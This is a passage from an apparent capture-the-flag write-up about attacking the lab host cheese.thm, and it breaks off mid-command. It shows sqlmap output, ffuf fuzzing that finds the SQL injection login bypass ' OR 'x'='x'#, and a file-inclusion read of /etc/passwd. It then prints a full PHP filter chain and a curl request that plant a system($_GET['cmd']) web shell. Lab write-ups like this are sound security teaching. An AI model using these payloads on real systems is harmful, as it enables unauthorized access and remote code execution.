</span></span><span class="line"><span class="cl"><span class="p">|</span>_ -<span class="p">|</span> . <span class="o">[</span>.<span class="o">]</span>     <span class="p">|</span> .<span class="s1">&#39;| . |                                                                                                                                    
</span></span></span><span class="line"><span class="cl"><span class="s1">|___|_  [)]_|_|_|__,|  _|                                                                                                                                    
</span></span></span><span class="line"><span class="cl"><span class="s1">     |_|V...       |_|   https://sqlmap.org                                                                                                                 
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> starting @ 07:29:47 /2024-09-30/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:47<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:47<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL content is stable
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL content is stable
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> POST parameter <span class="s1">&#39;username&#39;</span> is dynamic
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> POST parameter <span class="s1">&#39;username&#39;</span> does not appear to be dynamic
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test</span> shows that POST parameter <span class="s1">&#39;username&#39;</span> might not be injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">for</span> SQL injection on POST parameter <span class="s1">&#39;username&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:50<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:51<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:52<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:53<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic inline queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:53<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Microsoft SQL Server/Sybase stacked queries (comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:55<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:29:56<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:30:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;username&#39;</span> appears to be <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span> injectable 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> the remaining tests, <span class="k">do</span> you want to include all tests <span class="k">for</span> <span class="s1">&#39;MySQL&#39;</span> extending provided level <span class="o">(</span>1<span class="o">)</span> and risk <span class="o">(</span>1<span class="o">)</span> values? <span class="o">[</span>Y/n<span class="o">]</span> y
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:38:05<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:38:05<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:38:05<span class="o">]</span> <span class="o">[</span>CRITICAL<span class="o">]</span> unable to connect to the target URL. sqlmap is going to retry the request<span class="o">(</span>s<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>07:38:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> most likely web server instance hasn<span class="s1">&#39;t recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag &#39;</span>T<span class="s1">&#39; in option &#39;</span>--technique<span class="s1">&#39; (e.g. &#39;</span>--flush-session --technique<span class="o">=</span>BEUS<span class="s1">&#39;) or try to lower the value of option &#39;</span>--time-sec<span class="s1">&#39; (e.g. &#39;</span>--time-sec<span class="o">=</span>2<span class="s1">&#39;)                                                                                                                                                 
</span></span></span><span class="line"><span class="cl"><span class="s1">got a 302 redirect to &#39;</span>http://cheese.thm/secret-script.php?file<span class="o">=</span>supersecretadminpanel.html<span class="s1">&#39;. Do you want to follow? [Y/n] y
</span></span></span><span class="line"><span class="cl"><span class="s1">redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] y
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:32] [INFO] target URL appears to be UNION injectable with 3 columns
</span></span></span><span class="line"><span class="cl"><span class="s1">injection not exploitable with NULL values. Do you want to try with a random integer value for option &#39;</span>--union-char<span class="s1">&#39;? [Y/n] y
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:50] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. &#39;</span>--dbms<span class="o">=</span>mysql<span class="s1">&#39;) 
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:50] [INFO] checking if the injection point on POST parameter &#39;</span>username<span class="s1">&#39; is a false positive
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [WARNING] false positive or unexploitable injection point detected
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [WARNING] POST parameter &#39;</span>username<span class="s1">&#39; does not seem to be injectable
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [WARNING] POST parameter &#39;</span>password<span class="s1">&#39; does not appear to be dynamic
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [WARNING] heuristic (basic) test shows that POST parameter &#39;</span>password<span class="s1">&#39; might not be injectable
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [INFO] testing for SQL injection on POST parameter &#39;</span>password<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:55] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:56] [INFO] testing &#39;</span>Boolean-based blind - Parameter replace <span class="o">(</span>original value<span class="o">)</span><span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:38:56] [INFO] testing &#39;</span>Generic inline queries<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:48:00] [INFO] testing &#39;</span>Generic UNION query <span class="o">(</span>31<span class="o">)</span> - <span class="m">1</span> to <span class="m">10</span> columns<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:48:00] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:48:02] [WARNING] POST parameter &#39;</span>password<span class="s1">&#39; does not seem to be injectable
</span></span></span><span class="line"><span class="cl"><span class="s1">[07:48:02] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for &#39;</span>--level<span class="s1">&#39;/&#39;</span>--risk<span class="s1">&#39; options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option &#39;</span>--tamper<span class="s1">&#39; (e.g. &#39;</span>--tamper<span class="o">=</span>space2comment<span class="s1">&#39;) and/or switch &#39;</span>--random-agent<span class="err">&#39;</span>
</span></span></code></pre></div><p>Web app have SQLi vulnerability in its username parameter. Lets fuzz to get the vulnerable query parameter. Using <a href="https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt" target="_blank" rel="noopener">sql-injection-payload</a>
.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://cheese.thm/login.php -d <span class="s2">&#34;username=FUZZ&amp;password=adminpass&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -fs <span class="m">888</span> -w Auth_Bypass.txt
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39; OR &#39;</span>x<span class="s1">&#39;=&#39;</span>x<span class="err">&#39;</span><span class="c1">#;          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 165ms]</span>
</span></span></code></pre></div><p>Got a valid query parameter. Lets use this in username parameter for bypass the login.</p>
<p>



<figure>
    <img src="/posts/cheesectf/4.png" title="Admin Panel - Cheese shop" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>Admin Panel - Cheese shop</strong>
    </figcaption>  
</figure>

We got a simple admin panel here.</p>
<p>



<figure>
    <img src="/posts/cheesectf/7.png" title="Secret Message for Admin" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>Secret Message for Admin</strong>
    </figcaption>  
</figure>

We also have some secret message. Here we can see that <code>php filter</code> is passed to the <code>file parameter</code>.</p>
<p>



<figure>
    <img src="/posts/cheesectf/5.png" title="Burp-suite: cheese.thm/secret-script.php" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>Burp-suite: cheese.thm/secret-script.php</strong>
    </figcaption>  
</figure>

When intercepting the request using burpsuite, we can see that <code>secret-script.php</code> is getting the data of a file <code>supersecretadminpanel.html</code> using parameter <code>file</code>. Lets try to do <code>LFI</code>.</p>
<p>



<figure>
    <img src="/posts/cheesectf/6.png" title="LFI POC" style="display: block; margin: 0 auto;">
    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
        <strong>LFI POC</strong>
    </figcaption>  
</figure>

LFI is possible in the web app.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">comte:x:1000:1000:comte:/home/comte:/bin/bash
</span></span></code></pre></div><p>We got to know that there is a user <code>comte</code> in this machine. Lets try to get RCE using PHP filter in LFI.</p>
<p>Resources: <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters" target="_blank" rel="noopener">LFI2RCE via PHP filters | Hacktricks</a>
, <a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank" rel="noopener">php_filter_chain_generator</a>
.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ git clone https://github.com/synacktiv/php_filter_chain_generator
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> php_filter_chain_generator
</span></span><span class="line"><span class="cl">$ python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The following gadget chain will generate the following code : &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&#34;cmd&#34;</span><span class="o">])</span><span class="p">;</span>?&gt; <span class="o">(</span>base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4<span class="o">)</span>
</span></span><span class="line"><span class="cl">php://filter/convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP866.CSUNICODE<span class="p">|</span>convert.iconv.CSISOLATIN5.ISO_6937-2<span class="p">|</span>convert.iconv.CP950.UTF-16BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.865.UTF16<span class="p">|</span>convert.iconv.CP901.ISO6937<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.851.UTF-16<span class="p">|</span>convert.iconv.L1.T.618BIT<span class="p">|</span>convert.iconv.ISO-IR-103.850<span class="p">|</span>convert.iconv.PT154.UCS4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.JS.UNICODE<span class="p">|</span>convert.iconv.L4.UCS2<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.INIS.UTF16<span class="p">|</span>convert.iconv.CSIBM1133.IBM943<span class="p">|</span>convert.iconv.GBK.SJIS<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.PT.UTF32<span class="p">|</span>convert.iconv.KOI8-U.IBM-932<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.DEC.UTF-16<span class="p">|</span>convert.iconv.ISO8859-9.ISO_6937-2<span class="p">|</span>convert.iconv.UTF16.GB13000<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L6.UNICODE<span class="p">|</span>convert.iconv.CP1282.ISO-IR-90<span class="p">|</span>convert.iconv.CSA_T500-1983.UCS-2BE<span class="p">|</span>convert.iconv.MIK.UCS2<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.JS.UNICODE<span class="p">|</span>convert.iconv.L4.UCS2<span class="p">|</span>convert.iconv.UCS-2.OSF00030010<span class="p">|</span>convert.iconv.CSIBM1008.UTF32BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP861.UTF-16<span class="p">|</span>convert.iconv.L4.GB13000<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.iconv.CP950.UTF16<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.863.UNICODE<span class="p">|</span>convert.iconv.ISIRI3342.UCS4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.851.UTF-16<span class="p">|</span>convert.iconv.L1.T.618BIT<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.INIS.UTF16<span class="p">|</span>convert.iconv.CSIBM1133.IBM943<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP861.UTF-16<span class="p">|</span>convert.iconv.L4.GB13000<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.UTF8.UTF16LE<span class="p">|</span>convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.iconv.UCS2.UTF8<span class="p">|</span>convert.iconv.8859_3.UCS2<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.PT.UTF32<span class="p">|</span>convert.iconv.KOI8-U.IBM-932<span class="p">|</span>convert.iconv.SJIS.EUCJP-WIN<span class="p">|</span>convert.iconv.L10.UCS4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP367.UTF-16<span class="p">|</span>convert.iconv.CSIBM901.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.PT.UTF32<span class="p">|</span>convert.iconv.KOI8-U.IBM-932<span class="p">|</span>convert.iconv.SJIS.EUCJP-WIN<span class="p">|</span>convert.iconv.L10.UCS4<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.863.UTF-16<span class="p">|</span>convert.iconv.ISO6937.UTF16LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.864.UTF32<span class="p">|</span>convert.iconv.IBM912.NAPLPS<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP861.UTF-16<span class="p">|</span>convert.iconv.L4.GB13000<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L6.UNICODE<span class="p">|</span>convert.iconv.CP1282.ISO-IR-90<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.INIS.UTF16<span class="p">|</span>convert.iconv.CSIBM1133.IBM943<span class="p">|</span>convert.iconv.GBK.BIG5<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.865.UTF16<span class="p">|</span>convert.iconv.CP901.ISO6937<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP-AR.UTF16<span class="p">|</span>convert.iconv.8859_4.BIG5HKSCS<span class="p">|</span>convert.iconv.MSCP1361.UTF-32LE<span class="p">|</span>convert.iconv.IBM932.UCS-2BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L6.UNICODE<span class="p">|</span>convert.iconv.CP1282.ISO-IR-90<span class="p">|</span>convert.iconv.ISO6937.8859_4<span class="p">|</span>convert.iconv.IBM868.UTF-16LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.L4.UTF32<span class="p">|</span>convert.iconv.CP1250.UCS-2<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM921.NAPLPS<span class="p">|</span>convert.iconv.855.CP936<span class="p">|</span>convert.iconv.IBM-932.UTF-8<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.8859_3.UTF16<span class="p">|</span>convert.iconv.863.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP1046.UTF16<span class="p">|</span>convert.iconv.ISO6937.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP1046.UTF32<span class="p">|</span>convert.iconv.L6.UCS-2<span class="p">|</span>convert.iconv.UTF-16LE.T.61-8BIT<span class="p">|</span>convert.iconv.865.UCS-4LE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.MAC.UTF16<span class="p">|</span>convert.iconv.L8.UTF16BE<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CSIBM1161.UNICODE<span class="p">|</span>convert.iconv.ISO-IR-156.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.INIS.UTF16<span class="p">|</span>convert.iconv.CSIBM1133.IBM943<span class="p">|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.SE2.UTF-16<span class="p">|</span>convert.iconv.CSIBM1161.IBM-932<span class="p">|</span>convert.iconv.MS932.MS936<span class="p">|</span>convert.iconv.BIG5.JOHAB<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>php://temp
</span></span><span class="line"><span class="cl">$  curl <span class="s1">&#39;http://cheese.thm/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.